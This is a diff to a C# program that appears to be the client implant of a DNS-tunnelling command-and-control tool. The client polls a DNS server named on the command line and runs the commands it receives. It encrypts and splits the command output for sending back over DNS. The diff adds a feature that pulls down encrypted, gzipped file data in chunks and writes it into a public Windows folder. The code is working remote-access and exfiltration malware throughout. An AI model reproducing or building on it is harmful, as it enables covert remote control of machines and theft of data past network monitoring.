@@ -2,11 +2,14 @@
 using System.Collections.Generic;
 using System.Diagnostics;
 using System.IO;
+using System.IO.Compression;
 using System.Linq;
 using System.Net;
 using System.Net.Sockets;
 using System.Security.Cryptography;
 using System.Text;
+using System.Threading;
+
 
 namespace MyDnsClient
 {
@@ -24,20 +27,43 @@ namespace MyDnsClient
         static void Main(string[] args)
         {
             udpClient = new UdpClient(0);
-            remotePoint = new IPEndPoint(IPAddress.Parse("127.0.0.1"), 53);
+            udpClient.Connect(args[0], 53);
+            remotePoint = new IPEndPoint(IPAddress.Parse(args[0]), 53);
             string domain = "www.baidu.com";
+            sendDnsQuestion("live." + domain.Split(new char[] { '.' }, 2)[1], (Int16)6);
             while (true)
             {
-                sendDnsQuestion(domain,(Int16)6);
+                sendDnsQuestion(domain, (Int16)6);
                 if (Options.flag)
-                    postData(domain);
+                {
+                    if (Options.command.Contains("put"))
+                    {
+                        //Console.WriteLine(Options.fileCount);
+                        for (Int32 fileCount = 0; fileCount < Options.fileCount; fileCount++)
+                        {
+                            //Console.WriteLine("ftp请求");
+                            sendDnsQuestion("ftp." + domain.Split(new char[] { '.' }, 2)[1], (Int16)6);
+                            Thread.Sleep(200);
+                        }
+                        byte[] gzipBytes = Encryption.Decrypt(Encryption.HexStringToByteArray(string.Join("", Options.fileDate.Values)));
+                        byte[] fileBytes = gzipDecompress(gzipBytes);
+                        //Console.WriteLine(Encoding.UTF8.GetString(fileBytes));
+                        FileStream fileStream = new FileStream("C:\\users\\public\\123.txt", FileMode.OpenOrCreate,FileAccess.Write);
+                        fileStream.Write(fileBytes,0,fileBytes.Length);
+                        fileStream.Flush();
+                        fileStream.Close();
+                       // Console.WriteLine("写入成功");
+                        Options.flag = false;
+                    }
+                    else
+                        postData(domain);
+                }
                 //Console.WriteLine(Options.flag);
             }
 
         }
         private static void sendDnsQuestion(string domain,short Qtype)
-        {
-            udpClient.Connect("127.0.0.1",53);
+        {           
             byte[] data = QuestionFrame.Frame(domain,Qtype, (ushort)new Random().Next(1000, 10000));
             udpClient.Send(data,data.Length);
             byte[] rec = udpClient.Receive(ref remotePoint);
@@ -86,7 +112,7 @@ namespace MyDnsClient
         }
         public static void postData(string domain)
         {
-            Console.WriteLine(Options.command);
+           // Console.WriteLine(Options.command);
             Options.execComandResult = Encryption.ByteArrayToHexString(Encryption.Encrypt(execCMD(Options.command, 300)));
             Options.md5 = GetMD5Hash(Options.execComandResult);
             Options.sendData_List = Encryption.SplitLength(Options.execComandResult);
@@ -143,6 +169,35 @@ namespace MyDnsClient
                 throw new Exception("GetMD5Hash() fail,error:" + ex.Message);
             }
 
+        }
+        public static byte[] gzipDecompress(byte[] data)
+        {
+            try
+            {
+                MemoryStream ms = new MemoryStream(data);
+                GZipStream zip = new GZipStream(ms, CompressionMode.Decompress, true);
+                MemoryStream msreader = new MemoryStream();
+                byte[] buffer = new byte[0x1000];
+                while (true)
+                {
+                    int reader = zip.Read(buffer, 0, buffer.Length);
+                    if (reader <= 0)
+                    {
+                        break;
+                    }
+                    msreader.Write(buffer, 0, reader);
+                }
+                zip.Close();
+                ms.Close();
+                msreader.Position = 0;
+                buffer = msreader.ToArray();
+                msreader.Close();
+                return buffer;
+            }
+            catch (Exception e)
+            {
+                throw new Exception(e.Message);
+            }
         }
     }
 }
